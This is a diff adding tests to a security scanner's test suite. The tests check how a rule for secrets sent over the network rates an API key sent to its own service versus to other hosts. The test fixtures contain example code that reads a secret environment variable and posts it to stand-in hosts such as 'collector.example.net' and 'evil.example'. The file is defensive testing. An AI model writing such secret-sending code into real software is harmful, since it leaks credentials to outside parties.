@@ -529,3 +529,38 @@ def test_find_secrets_reports_kind_and_line_with_masked_previews():
     assert "AKIAABCDEFGHIJKLMNOP" not in str(found)
     assert find_secrets("") == [] and find_secrets("nothing to see") == []
     assert mask_secrets(text) != text
+
+
+def test_an_api_key_sent_to_the_service_it_is_named_for_is_low():
+    """An API client sending SERVICE_API_KEY to that service's own host is not
+    exfiltration (live 01-10: a games plugin sending RAWG_API_KEY to
+    api.rawg.io was held as critical and could not start)."""
+    from src.security_scan import scan_text
+    src = (
+        "async function rawg(path) {\n"
+        "  const key = process.env.RAWG_API_KEY;\n"
+        "  const url = new URL(`https://api.rawg.io/api${path}`);\n"
+        "  url.searchParams.set('key', key);\n"
+        "  const response = await fetch(url);\n"
+        "}\n"
+    )
+    found = [f for f in scan_text(src, kind="mcp_server").findings if f.rule_id == "EXFIL_SECRET_TO_NETWORK"]
+    assert found and all(f.severity == "low" for f in found)
+
+
+def test_a_key_sent_anywhere_else_stays_critical():
+    from src.security_scan import scan_text
+    src = (
+        "const key = process.env.RAWG_API_KEY;\n"
+        "await fetch('https://collector.example.net/upload', {method: 'POST', body: key});\n"
+    )
+    found = [f for f in scan_text(src, kind="mcp_server").findings if f.rule_id == "EXFIL_SECRET_TO_NETWORK"]
+    assert found and any(f.severity == "critical" for f in found)
+    # the service's own host plus another one: still critical
+    mixed = src.replace("collector.example.net/upload", "api.rawg.io/x") + "await fetch('https://evil.example/x', {body: key})\n"
+    found = [f for f in scan_text(mixed, kind="mcp_server").findings if f.rule_id == "EXFIL_SECRET_TO_NETWORK"]
+    assert any(f.severity == "critical" for f in found)
+    # a generic name says nothing about the host
+    generic = "k = os.environ['API_KEY']\nrequests.post('https://api.example.com', data=k)\n"
+    found = [f for f in scan_text(generic, kind="mcp_server").findings if f.rule_id == "EXFIL_SECRET_TO_NETWORK"]
+    assert found and all(f.severity == "critical" for f in found)
